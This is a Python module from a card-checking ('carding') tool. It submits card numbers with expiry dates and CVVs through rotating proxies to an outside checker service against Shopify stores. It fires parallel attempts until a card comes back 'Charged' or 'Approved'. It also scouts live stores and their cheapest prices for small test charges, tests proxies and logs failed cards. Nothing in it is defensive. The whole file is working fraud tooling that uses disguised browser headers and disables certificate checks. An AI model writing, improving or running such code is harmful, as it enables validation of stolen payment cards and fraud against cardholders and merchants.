"""
check_engine.py — Shopify checker via check.yzio.app

Site verification flow (in order):
  1. products.json  — Shopify's public endpoint, instant, gives REAL price
  2. API fallback   — check.yzio.app/shopify?site=…&cc=…&proxy=…
                      Any HTTP 200 with JSON = site is alive; extract price

Card check flow:
  - 4 parallel attempts (20s each), cancel on first Charged/Approved
  - Literal-pipe URLs (| stays |, never %7C)
  - Tolerant parsing of every response shape
"""
import asyncio
import aiohttp
import random
import json
import re
import os
from urllib.parse import quote
from config import API_ENDPOINTS_FILE, DEFAULT_API_ENDPOINTS, PROXY_FILE

_session_bad_sites = set()
_error_log_path = "error.txt"

def clear_session_bad_sites():
    global _session_bad_sites
    _session_bad_sites = set()

def clear_error_log():
    try:
        open(_error_log_path, 'w').close()
    except:
        pass

def _log_error_card(card, reason):
    try:
        with open(_error_log_path, 'a', encoding='utf-8') as f:
            f.write(f"{card}  # {reason[:100]}\n")
    except:
        pass

# ══════════════════════════════════════════════════════════════
# Endpoints config
# ══════════════════════════════════════════════════════════════
def load_api_endpoints() -> list:
    try:
        with open(API_ENDPOINTS_FILE) as f:
            eps = json.load(f).get('endpoints') or []
            return eps or list(DEFAULT_API_ENDPOINTS)
    except:
        return list(DEFAULT_API_ENDPOINTS)

def save_api_endpoints(endpoints: list):
    with open(API_ENDPOINTS_FILE, 'w') as f:
        json.dump({'endpoints': endpoints}, f, indent=2)

# ══════════════════════════════════════════════════════════════
# Proxy normalization
# ══════════════════════════════════════════════════════════════
def normalize_proxy(p: str) -> str:
    p = (p or '').strip()
    if not p:
        return p
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    if '@' in p:
        return p
    parts = p.split(':')
    if len(parts) == 2:
        return p
    if len(parts) == 4:
        return f"{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return p

def _proxy_to_url(p: str) -> str:
    p = (p or '').strip()
    if not p:
        return ''
    if p.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
        return p
    if '@' in p:
        return f'http://{p}'
    parts = p.split(':')
    if len(parts) == 2:
        return f'http://{p}'
    if len(parts) == 4:
        return f'http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}'
    return f'http://{p}'

def _load_proxies_file():
    try:
        with open(PROXY_FILE) as f:
            return [l.strip() for l in f if l.strip()]
    except:
        return []

# ══════════════════════════════════════════════════════════════
# Result builder
# ══════════════════════════════════════════════════════════════
def _make_result(card, status, message, price='-', gateway='Shopify Payments',
                 receipt_url='', retryable=False, proxy='', time=None):
    return {
        'status': status, 'message': message, 'card': card,
        'gateway': gateway, 'price': price, 'receipt_url': receipt_url,
        'retry': retryable, 'proxy': proxy, 'time': time,
    }

# ══════════════════════════════════════════════════════════════
# URL builder — LITERAL pipes
# ══════════════════════════════════════════════════════════════
def _build_check_url(api_url: str, site: str, cc: str, proxy: str) -> str:
    site_e  = quote(site.strip(),  safe=':/?=&%')
    cc_e    = quote(cc.strip(),    safe='|')
    proxy_e = quote(proxy.strip(), safe=':@')
    base = api_url.rstrip('/')
    return f"{base}/shopify?site={site_e}&cc={cc_e}&proxy={proxy_e}"

# ══════════════════════════════════════════════════════════════
# Response parsing
# ══════════════════════════════════════════════════════════════
def _extract_json(text: str):
    if not text:
        return None
    try:
        return json.loads(text)
    except Exception:
        pass
    m = re.search(r'\{[\s\S]*\}', text)
    if m:
        try:
            return json.loads(m.group(0))
        except Exception:
            pass
    return None

def _extract_any_price(data):
    """Deep-scan a dict for any plausible price number."""
    if isinstance(data, dict):
        for k in ('amount', 'price', 'total', 'cart_total', 'order_total',
                  'value', 'Price', 'Amount', 'Total'):
            v = data.get(k)
            if v is not None and v != '':
                try:
                    p = float(str(v).replace('$', '').replace(',', '').strip())
                    if 0 < p < 100000:
                        return p
                except:
                    pass
        for k in ('data', 'result', 'order', 'cart', 'response', 'details'):
            sub = data.get(k)
            if isinstance(sub, dict):
                p = _extract_any_price(sub)
                if p is not None:
                    return p
    return None

def _normalize_status(data: dict):
    if not isinstance(data, dict):
        return None
    for key in ('status', 'Status', 'state', 'result', 'Response'):
        v = data.get(key)
        if isinstance(v, str) and v.strip():
            s = v.upper()
            if 'CHARG' in s or 'PAID' in s or 'CAPTURE' in s:
                return 'Charged'
            if 'APPROV' in s or 'LIVE' in s or 'AUTH' in s or 'SUCCESS' in s:
                return 'Approved'
            if 'DECLIN' in s or 'DEAD' in s or 'FAIL' in s or 'ERROR' in s or 'INVALID' in s:
                return 'Dead'
    if data.get('charged') is True or data.get('paid') is True:
        return 'Charged'
    if data.get('approved') is True:
        return 'Approved'
    if data.get('success') is True:
        return 'Approved'
    if data.get('success') is False or data.get('declined') is True:
        return 'Dead'
    return None

def _extract_message(data) -> str:
    if not isinstance(data, dict):
        return ''
    for key in ('message', 'msg', 'response', 'reason', 'error', 'detail', 'note'):
        v = data.get(key)
        if isinstance(v, str) and v.strip():
            return v.strip()
        if isinstance(v, dict):
            for sub in ('message', 'msg', 'reason', 'detail'):
                sv = v.get(sub)
                if isinstance(sv, str) and sv.strip():
                    return sv.strip()
    return ''

def _extract_gateway(data) -> str:
    if not isinstance(data, dict):
        return 'Shopify Payments'
    for key in ('gateway', 'Gateway', 'gate', 'payment_gateway'):
        v = data.get(key)
        if isinstance(v, str) and v.strip():
            return v.strip()
    return 'Shopify Payments'

def _extract_receipt(data) -> str:
    if not isinstance(data, dict):
        return ''
    for key in ('receipt_url', 'receipt', 'receiptUrl', 'url'):
        v = data.get(key)
        if isinstance(v, str) and v.startswith('http'):
            return v
    return ''

# ══════════════════════════════════════════════════════════════
# Single API attempt (card check)
# ══════════════════════════════════════════════════════════════
async def _try_endpoint(api_url, shop_url, card, proxy_raw):
    url = _build_check_url(api_url, shop_url, card, proxy_raw)
    timeout = aiohttp.ClientTimeout(total=20, connect=6, sock_read=15)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
    }
    async with aiohttp.ClientSession(timeout=timeout) as s:
        async with s.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            http_status = r.status
            text = await r.text()

    data = _extract_json(text)

    if http_status != 200:
        msg = _extract_message(data) if isinstance(data, dict) else ''
        return _make_result(card, 'Dead', msg or f'HTTP {http_status}',
                            retryable=500 <= http_status < 600)

    if data is None:
        up = (text or '').upper()
        if 'CHARG' in up or 'PAID' in up or 'CAPTURE' in up:
            return _make_result(card, 'Charged', text.strip()[:200], proxy=proxy_raw)
        if 'APPROV' in up or 'LIVE' in up or 'AUTH' in up:
            return _make_result(card, 'Approved', text.strip()[:200], proxy=proxy_raw)
        if 'DECLIN' in up or 'FAIL' in up or 'DEAD' in up:
            return _make_result(card, 'Dead', text.strip()[:200])
        snippet = (text or '').strip()[:80]
        return _make_result(card, 'Dead', snippet or 'Empty response', retryable=True)

    status  = _normalize_status(data)
    message = _extract_message(data)
    amount  = _extract_any_price(data)
    amount  = f'${amount:.2f}' if amount is not None else '-'
    gateway = _extract_gateway(data)
    receipt = _extract_receipt(data)

    if status is None:
        snippet = message or json.dumps(data)[:120]
        return _make_result(card, 'Dead', snippet, retryable=True)

    if status == 'Charged':
        return _make_result(card, 'Charged', message or 'Charged',
                            price=amount, gateway=gateway,
                            receipt_url=receipt, proxy=proxy_raw)
    if status == 'Approved':
        return _make_result(card, 'Approved', message or 'Approved',
                            price=amount, gateway=gateway, proxy=proxy_raw)
    return _make_result(card, 'Dead', message or 'Declined',
                        gateway=gateway, retryable=bool(data.get('retryable', False)))

async def _try_endpoint_safe(endpoint, site, card, proxy):
    try:
        return await _try_endpoint(endpoint, site, card, proxy)
    except asyncio.TimeoutError:
        return _make_result(card, 'Dead', 'timeout', retryable=True)
    except aiohttp.ClientConnectorError:
        return _make_result(card, 'Dead', 'api_unreachable', retryable=True)
    except Exception as e:
        return _make_result(card, 'Dead', f'{type(e).__name__}: {str(e)[:60]}', retryable=True)

# ══════════════════════════════════════════════════════════════
# Parallel card check
# ══════════════════════════════════════════════════════════════
async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy=None):
    if not sites:
        return _make_result(card, 'Dead', 'No sites configured')
    if not proxies:
        return _make_result(card, 'Dead', 'No proxy configured')
    endpoints = load_api_endpoints()
    if not endpoints:
        return _make_result(card, 'Dead', 'No API endpoints configured')

    last_err = ''
    best_dead = None

    for _round in range(2):
        combos = [
            (random.choice(endpoints), random.choice(sites), random.choice(proxies))
            for _ in range(4)
        ]
        tasks = [
            asyncio.create_task(_try_endpoint_safe(ep, site, card, px))
            for ep, site, px in combos
        ]
        try:
            done, pending = await asyncio.wait(tasks, timeout=22,
                                               return_when=asyncio.FIRST_COMPLETED)
        except Exception:
            for t in tasks: t.cancel()
            continue

        while done:
            for t in list(done):
                try:
                    r = t.result()
                except Exception:
                    continue
                if r is None:
                    continue
                if r['status'] in ('Charged', 'Approved'):
                    for p in pending: p.cancel()
                    return r
                if r['status'] == 'Dead' and not r.get('retry'):
                    if best_dead is None:
                        best_dead = r
                if not last_err and r.get('message'):
                    last_err = r['message']

            if best_dead:
                for p in pending: p.cancel()
                return best_dead

            if not pending:
                break
            try:
                done, pending = await asyncio.wait(pending, timeout=22,
                                                   return_when=asyncio.FIRST_COMPLETED)
            except Exception:
                for t in pending: t.cancel()
                break

        if best_dead:
            return best_dead

    _log_error_card(card, last_err or 'all_attempts_failed')
    return _make_result(card, 'Dead', last_err or 'Check failed — no usable response')

# ══════════════════════════════════════════════════════════════
# SITE VERIFICATION — products.json FIRST (guaranteed price)
# ══════════════════════════════════════════════════════════════
async def _check_products_json(site_url):
    """
    Hit Shopify's public products.json — works on every live Shopify store.
    Returns (alive, price, reason).
    """
    site = site_url.strip().rstrip('/')
    if not site.startswith('http'):
        site = 'https://' + site

    try_urls = [f"{site}/products.json"]
    if '://www.' in site:
        try_urls.append(f"{site.replace('://www.', '://')}/products.json")
    elif '://' in site:
        try_urls.append(f"{site.replace('://', '://www.')}/products.json")

    timeout = aiohttp.ClientTimeout(total=12, connect=5)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'application/json',
    }

    async with aiohttp.ClientSession(timeout=timeout) as s:
        for url in try_urls:
            try:
                async with s.get(url, headers=headers, ssl=False,
                                 allow_redirects=True) as r:
                    if r.status != 200:
                        continue
                    text = await r.text()
                    try:
                        data = json.loads(text)
                    except:
                        continue
                    if not isinstance(data, dict) or 'products' not in data:
                        continue
                    products = data.get('products', [])
                    if not products:
                        return True, None, 'Shopify store (no products)'

                    prices = []
                    for p in products[:15]:
                        for v in p.get('variants', []):
                            try:
                                pr = float(v.get('price', 0))
                                if pr > 0:
                                    prices.append(pr)
                            except:
                                pass

                    if not prices:
                        return True, None, 'Shopify store (no prices)'

                    return True, min(prices), 'products.json ✓'
            except Exception:
                continue

    return False, None, 'products.json 404/blocked'

# Test cards — used only for API fallback
_TEST_CARDS = [
    "5154623245618097|03|2032|156",
    "4263982640269299|02|2027|423",
    "4242424242424242|12|2030|123",
]

async def _check_via_api(site):
    """
    Fallback: call the checker API for a specific site.
    Any HTTP 200 with JSON (or any body) = site is alive.
    Extract price from any field, else return None.
    """
    endpoints = load_api_endpoints()
    if not endpoints:
        return False, None, 'No API endpoints configured'
    proxies = _load_proxies_file()
    if not proxies:
        return False, None, 'No proxies available (add proxies first)'

    endpoint = random.choice(endpoints)
    last_reason = 'API test failed'

    for card in _TEST_CARDS:
        proxy = random.choice(proxies)
        try:
            url = _build_check_url(endpoint, site, card, proxy)
            timeout = aiohttp.ClientTimeout(total=22, connect=6, sock_read=18)
            headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, */*'}
            async with aiohttp.ClientSession(timeout=timeout) as s:
                async with s.get(url, headers=headers, ssl=False,
                                 allow_redirects=True) as r:
                    if r.status != 200:
                        last_reason = f'HTTP {r.status}'
                        continue
                    text = await r.text()
                    data = _extract_json(text)
                    if data is None:
                        # Non-JSON but 200 — site is alive
                        return True, None, f'API: {text.strip()[:40]}'
                    price = _extract_any_price(data)
                    return True, price, 'API ✓'
        except asyncio.TimeoutError:
            last_reason = 'API timeout'
            continue
        except Exception as e:
            last_reason = f'{type(e).__name__}'
            continue

    return False, None, last_reason

async def test_site_with_price(site_url: str):
    """
    Public helper used by /addsite and /site.
    Returns (alive: bool, price: float|None, reason: str)

    Order:
      1. products.json   (no proxy, no card needed — most reliable)
      2. API fallback    (needs proxies)
    """
    # Method 1
    alive, price, reason = await _check_products_json(site_url)
    if alive:
        return alive, price, reason

    # Method 2
    alive, price, reason = await _check_via_api(site_url)
    if alive:
        return alive, price, reason

    # Both failed
    return False, None, f'{reason} | products.json also failed'

async def test_site(site, proxy=None):
    """Legacy wrapper (bot.py uses test_site_with_price directly)."""
    alive, price, reason = await test_site_with_price(site)
    return {'site': site,
            'status': 'alive' if alive else 'dead',
            'msg': reason,
            'price': price}

# ══════════════════════════════════════════════════════════════
# Proxy tester
# ══════════════════════════════════════════════════════════════
async def test_proxy(proxy: str) -> dict:
    url = _proxy_to_url(proxy)
    if not url:
        return {'proxy': proxy, 'status': 'dead'}
    targets = ['http://httpbin.org/ip', 'http://api.ipify.org', 'http://icanhazip.com']
    try:
        timeout = aiohttp.ClientTimeout(total=12, connect=5)
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            for u in targets:
                try:
                    async with s.get(u, proxy=url, allow_redirects=True) as r:
                        if r.status == 200:
                            return {'proxy': proxy, 'status': 'alive'}
                except Exception:
                    continue
    except Exception:
        pass
    return {'proxy': proxy, 'status': 'dead'}

async def get_proxy_ip(proxy: str):
    url = _proxy_to_url(proxy)
    if not url or url.startswith('socks'):
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=12, connect=5)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get('https://api.ipify.org', proxy=url) as r:
                if r.status == 200:
                    return (await r.text()).strip()
    except Exception:
        pass
    return None
